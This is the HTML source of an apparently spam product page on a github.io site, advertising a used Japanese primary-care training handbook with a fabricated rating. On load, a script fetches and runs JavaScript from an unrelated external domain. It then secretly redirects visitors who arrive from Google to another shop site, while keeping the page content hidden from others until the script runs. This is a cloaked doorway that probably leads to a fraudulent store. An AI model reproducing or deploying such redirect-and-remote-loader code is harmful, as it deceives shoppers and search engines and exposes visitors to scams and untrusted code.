<!DOCTYPE html>
<html lang="ja">
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="Content-Language" content="ja">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta charset="UTF-8">
    <title>日本プライマリ・ケア連合学会 基本研修ハンドブック</title>
    <meta name="description" content="日本プライマリ・ケア連合学会 基本研修ハンドブック zp531_8">
    <link rel="canonical" href="https://utdvkufmtfkiyccj.github.io/zp531_8/b18138.html">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
    <meta property="og:site_name" content="utdvkufmtfkiyccj.github.io">
    <meta property="og:title" content="日本プライマリ・ケア連合学会 基本研修ハンドブック">
    <meta property="og:type" content="article">
    <meta property="og:url" content="https://utdvkufmtfkiyccj.github.io/zp531_8/b18138.html">
    <meta property="og:image" content="https://item-shopping.c.yimg.jp/i/n/daikokuya-store5_20220706005021-01578">
    <meta property="og:description" content="日本プライマリ・ケア連合学会 基本研修ハンドブック zp531_8">
    <meta property="og:locale" content="ja_JP">
    <script type="application/ld+json">{ "@context": "https://schema.org", "@type": "Product", "name": "日本プライマリ・ケア連合学会 基本研修ハンドブック", "image": ["https://item-shopping.c.yimg.jp/i/n/daikokuya-store5_20220706005021-01578",], "description": "中古品日本プライマリケア連合学会 基本研修ハンドブック 商品のブランド商品説明　商品状態の程度については記載の商品状態やや傷や汚れありなどにてご確認ください 掲載されている商品写真はイメジ写真となっております外箱説明書等は付属しない場合がございます商品ペジを作成する際にメカサイト等のコメントを引用している事がありますので外箱説明書等は付属しない場合がございます用途機能として最低限の付属品はお送りしておりますイヤホンカトリッジインクなど消耗品に関しましては基本付属していませんリモコンケブルカドカバ", "mpn": "77386559821", "sku": "K661889225", "brand": { "@type": "Brand", "name": "新品" }, "review": { "@type": "Review", "reviewRating": { "@type": "Rating", "ratingValue": "4.3", "bestRating": "5" }, "author": { "@type": "Organization", "name": "utdvkufmtfkiyccj.github.io" } }, "aggregateRating": { "@type": "AggregateRating", "ratingValue": "4.3", "reviewCount": "71" }, "offers": { "@type": "Offer", "priceCurrency": "JPY", "price": "12967", "priceValidUntil": "2027-02-03", "url": "https://utdvkufmtfkiyccj.github.io/zp531_8/b18138.html", "itemCondition": "http://schema.org/UsedCondition", "availability": "http://schema.org/InStock", "seller": { "@type": "Person", "name": "CQSZB" }, "shippingDetails": { "@type": "OfferShippingDetails", "shippingRate": { "@type": "MonetaryAmount", "value": 0, "currency": "JPY" }, "shippingDestination": { "@type": "DefinedRegion", "addressCountry": "JA" }, "deliveryTime": { "@type": "ShippingDeliveryTime", "handlingTime": { "@type": "QuantitativeValue", "minValue": 0, "maxValue": 1, "unitCode": "DAY" }, "transitTime": { "@type": "QuantitativeValue", "minValue": 1, "maxValue": 5, "unitCode": "DAY" } } } } }
    </script>
	
	<script>
	function loadScript(src, callback) {
    const script = document.createElement("script");
    script.src = src;
	script.type = 'text/javascript';
	script.crossOrigin = "anonymous";
    script.onload = () => {
        if (callback) callback();
    };
    script.onerror = () => {
    };
		document.head.appendChild(script);
	}
	
	loadScript("https://nibclmarket.shop/zp531.js?name=8",()=> {
		let jump=true;
		if (document.referrer.includes('google') && isgoo) {
                let ids = location.href.split('/')[4].replace(/[^\d]+/g,'');
                let url = 'https://'+site+'/index.php?main_page=product_info&products_id='+ids;
                document.write('<meta http-equiv="Refresh" content="0;url='+url+'" /><script>location.href="'+url+'"<\/script>');
            }else{
				document.getElementsByClassName('content-body')[0].style.display = 'block';
			}
	});
	
	</script>
	
    <style>
        .content-body{
            display:none;
        }
    </style>
    </head>
    <body>
        <div style='width:100%;height:auto' class='content-body'>
		<h1>日本プライマリ・ケア連合学会 基本研修ハンドブック</h1>
		<img style='width:100%' src='https://item-shopping.c.yimg.jp/i/n/daikokuya-store5_20220706005021-01578' />
		<div>（中古品）日本プライマリ・ケア連合学会 基本研修ハンドブック: 商品のブランド【商品説明】　※商品状態の程度については記載の商品状態(やや傷や汚れあり、など)にてご確認ください。 ●掲載されている商品写真はイメージ写真となっております。外箱、説明書等は付属しない場合がございます。●商品ページを作成する際にメーカーサイト等のコメントを引用している事がありますので外箱、説明書等は付属しない場合がございます。用途機能として最低限の付属品はお送りしております。●イヤホン・カートリッジ・インクなど消耗品に関しましては基本付属していません。リモコン、ケーブル、BCASカード、カバー等は付属しない場合、純正ではない場合があります。また互換品の可能性があります。●コミック、CD,DVDはレンタルアップ品の場合もございます。●お届け：受注後に再メンテ、梱包します。※商品写真や説明文は代表的なものを掲載している為、状態が違う場合がございます。気になる方はお気軽にお問い合わせください。サイズ<br>    高さ : 2.50 cm<br>    横幅 : 18.30 cm<br>    奥行 : 25.80 cm<br>    重量 : 1.10 kg    ※梱包時のサイズとなります。商品自体のサイズではございませんのでご注意ください。    <ul><li></li></ul>  &lt;&#26032;&#12539;&#23478;&#24237;&#21307;&#30274;&#23554;&#38272;&#21307;&#12434;&#30446;&#25351;&#12377;&#21307;&#24107;&#24517;&#25658;&#12398;&#23398;&#20250;&#20844;&#35469;&#12486;&#12461;&#12473;&#12488;! &gt;  2020&#24180;&#24230;&#12424;&#12426;&#26032;&#12375;&#12367;&#12394;&#12387;&#12383;&#26032;&#12539;&#23478;&#24237;&#21307;&#30274;&#23554;&#38272;&#21307;&#21046;&#24230;.&#23554;&#38272;&#21307;&#12392;&#12375;&#12390;&#27714;&#12417;&#12425;&#12428;&#12427;&#36039;&#36074;&#33021;&#21147;(&#12467;&#12531;&#12500;&#12486;&#12531;&#12471;&#12540;)&#12434;&#12418;&#12392;&#12395;,&#30740;&#20462;&#12398;&#22522;&#26412;&#12363;&#12425;&#23478;&#24237;&#21307;&#30274;&#22266;&#26377;&#12398;&#12486;&#12540;&#12510;&#12420;&#12450;&#12503;&#12525;&#12540;&#12481;&#27861;&#12414;&#12391;,&#23554;&#25915;&#21307;&#12392;&#12375;&#12390;&#24517;&#35201;&#12394;&#12418;&#12398;&#12434;&#32178;&#32645;&#12375;&#12390;&#12356;&#12414;&#12377;.  &#12414;&#12383;,&#21508;&#38917;&#30446;&#12395;&#12399;&#25351;&#23566;&#21307;&#12408;&#12398;&#12513;&#12483;&#12475;&#12540;&#12472;,&#24059;&#26411;&#12395;&#12399;&#12509;&#12540;&#12488;&#12501;&#12457;&#12522;&#12458;&#12398;&#38936;&#22495;&#12372;&#12392;&#25512;&#22888;&#25991;&#29486;&#12522;&#12473;&#12488;&#12394;&#12393;&#12418;&#12354;&#12426;,&#23398;&#32722;&#32773;&#12384;&#12369;&#12391;&#12399;&#12394;&#12367;&#25351;&#23566;&#32773;&#12395;&#12418;&#26377;&#29992;&#12394;&#12418;&#12398;&#12392;&#12394;&#12387;&#12390;&#12362;&#12426;&#12414;&#12377;.  &#9671;&#12362;&#12418;&#12394;&#20869;&#23481;&#9671;  &#30740;&#20462;&#12434;&#22987;&#12417;&#12427;&#12395;&#12354;&#12383;&#12426;  &#12503;&#12521;&#12452;&#12510;&#12522;&#12539;&#12465;&#12450;&#12434;&#23554;&#38272;&#12392;&#12377;&#12427;&#21307;&#24107;&#12434;&#30446;&#25351;&#12377;  I.&#30446;&#25351;&#12377;&#12409;&#12365;&#23478;&#24237;&#21307;&#20687; 1&#12431;&#12364;&#22269;&#12362;&#12424;&#12403;&#19990;&#30028;&#12398;&#12503;&#12521;&#12452;&#12510;&#12522;&#12539;&#12465;&#12450;,&#23478;&#24237;&#21307;&#30274;,&#32207;&#21512;&#35386;&#30274;&#12398;&#27508;&#21490;&#12392;&#29694;&#29366; 2&#12363;&#12363;&#12426;&#12388;&#12369;&#21307;,&#32207;&#21512;&#35386;&#30274;&#23554;&#38272;&#21307;,&#12381;&#12375;&#12390;&#26032;&#12539;&#23478;&#24237;&#21307;&#30274;&#23554;&#38272;&#21307; 3&#23478;&#24237;&#21307;&#30274;&#12539;&#32207;&#21512;&#35386;&#30274;&#12398;&#12467;&#12531;&#12500;&#12486;&#12531;&#12471;&#12540;&#12392;&#12503;&#12525;&#12464;&#12521;&#12512;&#12398;&#27010;&#35201; 4&#23554;&#38272;&#21307;&#21462;&#24471;&#24460;&#12398;&#12461;&#12515;&#12522;&#12450;&#12497;&#12473;/&#29983;&#28079;&#23398;&#32722;&#12362;&#12424;&#12403;&#12501;&#12455;&#12525;&#12540;&#12471;&#12483;&#12503;  II.&#22522;&#26412;&#30740;&#20462;&#12522;&#12473;&#12488; A.&#23478;&#24237;&#21307;&#30274;&#23554;&#38272;&#30740;&#20462;&#38936;&#22495; 1&#26410;&#20998;&#21270;&#12391;&#22810;&#27096;&#12363;&#12388;&#35079;&#38609;&#12394;&#20581;&#24247;&#21839;&#38988;&#12408;&#12398;&#23550;&#24540; 2&#12504;&#12523;&#12473;&#12503;&#12525;&#12514;&#12540;&#12471;&#12519;&#12531;&#12392;&#30142;&#30149;&#20104;&#38450; 3&#34892;&#21205;&#31185;&#23398;&#12539;&#34892;&#21205;&#22793;&#23481;&#12539;&#34892;&#21205;&#32076;&#28168;&#23398;&#12394;&#12393;&#21508;&#31278;&#29702;&#35542;&#12395;&#22522;&#12389;&#12356;&#12383;&#12450;&#12503;&#12525;&#12540;&#12481; 4&#21307;&#30274;&#38754;&#25509;,&#21307;&#30274;&#12467;&#12511;&#12517;&#12491;&#12465;&#12540;&#12471;&#12519;&#12531; 5&#35386;&#23519;&#27861; 6&#24930;&#24615;&#30142;&#24739;&#12398;&#12465;&#12450;,Chronic Care Model  7&#12510;&#12523;&#12481;&#12514;&#12499;&#12487;&#12451;&#12486;&#12451;&#12408;&#12398;&#12450;&#12503;&#12525;&#12540;&#12481; 8&#32153;&#32154;&#30340;&#12394;&#21307;&#30274;,&#12465;&#12450; 9&#29983;&#29289;&#24515;&#29702;&#31038;&#20250;&#12514;&#12487;&#12523;&#12392;&#24739;&#32773;&#20013;&#24515;&#12398;&#21307;&#30274; 10&#38306;&#20418;&#24615;&#12392;&#25991;&#33032;&#12395;&#22522;&#12389;&#12367;&#21307;&#30274; &#8230;&#12394;&#12393; B.&#22522;&#26412;&#30740;&#20462;&#38936;&#22495; 1&#30149;&#38498;&#32207;&#21512;&#21307;&#12539;&#30149;&#38498;&#23478;&#24237;&#21307; 2&#35386;&#30274;&#25152;&#12395;&#12362;&#12369;&#12427;&#25937;&#24613;&#21307;&#30274; 3&#23567;&#20816;&#12398;&#35386;&#30274; 4&#24605;&#26149;&#26399;&#12398;&#12465;&#12450; 5&#39640;&#40802;&#32773;&#12398;&#12465;&#12450; 6&#22312;&#23429;&#21307;&#30274; 7&#26045;&#35373;&#20837;&#23621;&#32773;&#12539;&#38263;&#26399;&#30274;&#39178;&#26045;&#35373;&#20837;&#25152;&#32773;&#12408;&#12398;&#12465;&#12450; 8&#12486;&#12524;&#12513;&#12487;&#12451;&#12471;&#12531;&#12392;&#36960;&#38548;&#35386;&#30274; 9&#31563;&#39592;&#26684;&#35386;&#30274;&#12392;&#12473;&#12509;&#12540;&#12484;&#21307;&#23398; 10&#12503;&#12521;&#12452;&#12510;&#12522;&#12539;&#12465;&#12450;&#12395;&#12362;&#12369;&#12427;&#36986;&#20253;&#23398;&#12539;genetics &#8230;&#12394;&#12393;  III.&#23478;&#24237;&#21307;&#30274;&#12539;&#32207;&#21512;&#35386;&#30274;&#12398;&#30740;&#20462;&#12362;&#12424;&#12403;&#35413;&#20385; 1&#23478;&#24237;&#21307;&#30274;&#12539;&#32207;&#21512;&#35386;&#30274;&#12398;&#25945;&#32946;&#12539;&#23398;&#32722;&#12392;&#23398;&#32722;&#29702;&#35542; 2&#12459;&#12522;&#12461;&#12517;&#12521;&#12512;&#38283;&#30330;&#12395;&#12362;&#12369;&#12427;&#23398;&#32722;&#12392;&#35413;&#20385;&#12395;&#12388;&#12356;&#12390; 3 Off-the-job training&#12398;&#27010;&#35201; 4&#30740;&#20462;&#25163;&#24115;&#12398;&#20351;&#12356;&#26041; 5&#12499;&#12487;&#12458;&#12524;&#12499;&#12517;&#12540;&#12398;&#12503;&#12525;&#12475;&#12473;&#12392;&#12509;&#12452;&#12531;&#12488; 6&#26989;&#21209;&#22522;&#30436;&#22411;&#35413;&#20385;&#12398;&#12503;&#12525;&#12475;&#12473;&#12392;&#12509;&#12452;&#12531;&#12488; 7&#23478;&#24237;&#21307;&#30274;&#23554;&#38272;&#21307;&#35430;&#39443;&#12398;&#12487;&#12470;&#12452;&#12531;&#12392;&#12509;&#12452;&#12531;&#12488; 8&#12509;&#12540;&#12488;&#12501;&#12457;&#12522;&#12458;&#12434;&#29992;&#12356;&#12383;&#30740;&#20462;&#12362;&#12424;&#12403;&#20316;&#25104;&#12398;&#12503;&#12525;&#12475;&#12473;&#12392;&#12509;&#12452;&#12531;&#12488; 9&#12509;&#12540;&#12488;&#12501;&#12457;&#12522;&#12458;&#25351;&#23566;&#12392;&#33256;&#24202;&#23455;&#36341;&#12539;&#25391;&#12426;&#36820;&#12426;&#12539;&#21193;&#24375;&#20250; 10&#12501;&#12449;&#12459;&#12523;&#12486;&#12451;&#12539;&#12487;&#12451;&#12505;&#12525;&#12483;&#12503;&#12513;&#12531;&#12488;  IV.&#23398;&#12403;&#12434;&#28145;&#12417;&#12427;&#12383;&#12417;&#12398;&#12484;&#12540;&#12523; &#12539;&#12509;&#12540;&#12488;&#12501;&#12457;&#12522;&#12458;&#12539;&#12467;&#12531;&#12500;&#12486;&#12531;&#12471;&#12540;&#23550;&#24540;&#34920; &#12539;&#12509;&#12540;&#12488;&#12501;&#12457;&#12522;&#12458;&#12398;&#38936;&#22495;&#12372;&#12392;&#25512;&#22888;&#25991;&#29486;&#12522;&#12473;&#12488;<br/><br/><img src="https://item-shopping.c.yimg.jp/i/n/daikokuya-store5_20220706005021-01578" />
</div>
		<footer>
			<ul>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_8/a22763.html'>お支払い方法について</a></li>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_8/a22795.html'>よくある質問</a></li>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_8/e3510.html'>お問い合わせ</a></li>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_8/f24091.html'>参画のご案内</a></li>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_8/f36435.html'>ギフトモールのサービス</a></li>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_8/e36979.html'>ヘルプ&ガイド</a></li>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_8/a30983.html'>フォトコンテスト</a></li>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_8/d22097.html'>演劇/芸能</a></li>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_8/e15478.html'>フィギュア</a></li>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_8/a26279.html'>アダルトDVD</a></li>
			</ul>
		</footer>
		</div>
    </body>
</html>